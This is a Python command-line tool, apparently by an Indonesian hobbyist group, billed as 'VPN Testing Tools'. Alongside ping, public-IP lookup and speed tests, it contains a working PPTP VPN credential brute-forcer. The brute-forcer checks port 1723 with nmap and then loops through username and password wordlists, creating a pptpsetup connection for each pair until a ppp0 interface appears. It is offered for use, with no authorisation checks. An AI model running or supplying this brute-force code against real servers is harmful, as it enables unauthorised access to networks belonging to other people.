#!/usr/bin/env python3
import sys
import subprocess
import platform
import time

# === AUTO-INSTALL PAKET YANG DIPERLUKAN ===
def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--upgrade", "--quiet", "--break-system-packages"])
    except Exception as e:
        print(f"Error installing {package}: {e}")

# Daftar paket yang dibutuhkan
required_packages = {
    "colorama": "colorama",
    "requests": "requests",
    "speedtest": "speedtest-cli",  # package name di pip: speedtest-cli
    "tqdm": "tqdm"
}

# Coba import, jika gagal, install paketnya
for module, package in required_packages.items():
    try:
        __import__(module)
    except ImportError:
        print(f"[INFO] Installing missing package: {package}")
        install_package(package)

# === IMPORT MODULE YANG DIPERLUKAN ===
from colorama import init, Fore, Style
init(autoreset=True)
import requests
import speedtest
from tqdm import tqdm

# === BANNER DAN VALIDASI SYSTEM ===
def print_banner():
    banner = f"""
{Fore.MAGENTA}{Style.BRIGHT}============================================
          VPN Testing Tools
    Dev By Majalengka Cyber Tester
============================================
    """
    print(banner)

def validate_os_and_packages():
    os_type = platform.system()
    print(Fore.CYAN + f"\n[+] Detected OS: {os_type}")
    if os_type == "Linux":
        # Cek pptpsetup
        print(Fore.YELLOW + "Checking for pptpsetup...")
        result = subprocess.run(["which", "pptpsetup"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print(Fore.YELLOW + "pptpsetup not found. Attempting to install pptp-linux...")
            subprocess.run(["sudo", "apt-get", "install", "pptp-linux", "-y"])
        else:
            print(Fore.GREEN + "pptpsetup is available.")
        # Cek nmap untuk pengecekan port
        print(Fore.YELLOW + "Checking for nmap...")
        result = subprocess.run(["which", "nmap"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print(Fore.YELLOW + "nmap not found. Attempting to install nmap...")
            subprocess.run(["sudo", "apt-get", "install", "nmap", "-y"])
        else:
            print(Fore.GREEN + "nmap is available.")
    else:
        print(Fore.RED + "This tool is designed for Linux only.")
        sys.exit(1)
    print(Fore.YELLOW + "All required Python modules are installed.")

# === FUNGSI PENGUJIAN ===
def test_connectivity(host='8.8.8.8'):
    print(Fore.CYAN + f"\n[Connectivity Test] Pinging {host}...")
    param = "-c" if platform.system() != "Windows" else "-n"
    result = subprocess.run(["ping", param, "4", host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(Fore.GREEN + result.stdout.decode())

def test_dns_leak():
    print(Fore.CYAN + "\n[DNS Leak Test] Checking public IP...")
    try:
        ip = requests.get('https://api.ipify.org').text
        print(Fore.GREEN + f"Public IP: {ip}")
        location_info = requests.get(f'https://ipinfo.io/{ip}/json').json()
        print(Fore.GREEN + f"Location: {location_info.get('city')}, {location_info.get('region')}, {location_info.get('country')}")
        print(Fore.GREEN + f"ISP: {location_info.get('org')}")
    except Exception as e:
        print(Fore.RED + f"DNS Leak Test failed: {e}")

def test_speed():
    print(Fore.CYAN + "\n[Speed Test] Measuring internet speed...")
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1_000_000  # Mbps
        upload_speed = st.upload() / 1_000_000      # Mbps
        print(Fore.GREEN + f"Download Speed: {download_speed:.2f} Mbps")
        print(Fore.GREEN + f"Upload Speed: {upload_speed:.2f} Mbps")
    except Exception as e:
        print(Fore.RED + f"Speed Test failed: {e}")

# === FUNGSI PENGECEKAN PORT PPTP MENGGUNAKAN NMAP ===
def check_pptp_port(server_ip):
    print(Fore.CYAN + f"\n[Port Check] Checking if PPTP port (1723) is open on {server_ip} using nmap...")
    result = subprocess.run(["nmap", "-p", "1723", server_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode().lower()
    if "open" in output:
        print(Fore.GREEN + f"PPTP port 1723 on {server_ip} is open.")
        return True
    else:
        print(Fore.RED + f"PPTP port 1723 on {server_ip} is not open or filtered.")
        return False

# === BRUTE-FORCE VPN PPTP UNTUK LINUX ===
def vpn_bruteforce_linux(server_ip, username_file, password_file):
    print(Fore.CYAN + f"\n[+] Starting brute-force on {server_ip} (Linux - PPTP)...")
    try:
        with open(username_file, 'r') as uf:
            usernames = uf.read().splitlines()
    except Exception as e:
        print(Fore.RED + f"Error reading username file: {e}")
        return None

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as pf:
            passwords = pf.read().splitlines()
    except Exception as e:
        print(Fore.RED + f"Error reading password file: {e}")
        return None

    total_attempts = len(usernames) * len(passwords)
    attempt_count = 0
    progress = tqdm(total=total_attempts, desc="Brute Force Progress", ncols=80, bar_format="{l_bar}{bar} | {n_fmt}/{total_fmt}")

    for username in usernames:
        for password in passwords:
            attempt_count += 1
            # Update progress bar description in-place (tanpa mencetak baris baru)
            progress.set_description(f"Trying {username}:{password} ({attempt_count}/{total_attempts})")
            progress.update(1)
            
            # Pastikan koneksi VPN sebelumnya terputus
            subprocess.run(["poff", "vpn"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["pptpsetup", "--delete", "vpn"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Buat konfigurasi VPN baru dengan PPTP dan mulai koneksi
            subprocess.run(["pptpsetup", "--create", "vpn", "--server", server_ip,
                            "--username", username, "--password", password, "--encrypt", "--start"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # [MODIFIKASI] Tambahkan perintah pon vpn secara eksplisit
            subprocess.run(["pon", "vpn"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Tunggu agar koneksi terbentuk
            time.sleep(10)
            
            # Cek apakah interface ppp0 sudah ada (menandakan VPN berhasil)
            check = subprocess.run(["ifconfig", "ppp0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = check.stdout.decode().strip()
            if output and "ppp0" in output:
                progress.close()
                return (username, password)
    progress.close()
    return None

# === PROGRAM UTAMA ===
def main():
    validate_os_and_packages()
    print_banner()
    
    print(Fore.CYAN + "1. Connectivity Test")
    print(Fore.CYAN + "2. DNS Leak Test")
    print(Fore.CYAN + "3. Speed Test")
    print(Fore.CYAN + "4. Brute-force VPN (PPTP)")
    choice = input(Fore.YELLOW + "Choose an option (1/2/3/4): ").strip()
    
    if choice == '1':
        host = input(Fore.YELLOW + "Enter host to ping (default 8.8.8.8): ").strip() or "8.8.8.8"
        test_connectivity(host)
    elif choice == '2':
        test_dns_leak()
    elif choice == '3':
        test_speed()
    elif choice == '4':
        server_ip = input(Fore.YELLOW + "Enter VPN server IP: ").strip()
        # Lakukan pengecekan port PPTP menggunakan nmap
        if not check_pptp_port(server_ip):
            print(Fore.RED + "PPTP port check failed. Aborting brute-force.")
            return
        username_file = input(Fore.YELLOW + "Enter path to username wordlist: ").strip()
        password_file = input(Fore.YELLOW + "Enter path to password wordlist: ").strip()
        result = vpn_bruteforce_linux(server_ip, username_file, password_file)
        if result:
            username, password = result
            print(Fore.GREEN + f"\n[+] VPN successfully connected with {username}:{password}!")
            print(Fore.GREEN + "[NOTIFICATION] VPN successfully connected!")
            # Jalankan tes tambahan
            test_connectivity()
            test_dns_leak()
            test_speed()
        else:
            print(Fore.RED + "\n[-] Brute-force failed. No valid credentials found.")
    else:
        print(Fore.RED + "Invalid option.")

if __name__ == '__main__':
    main()
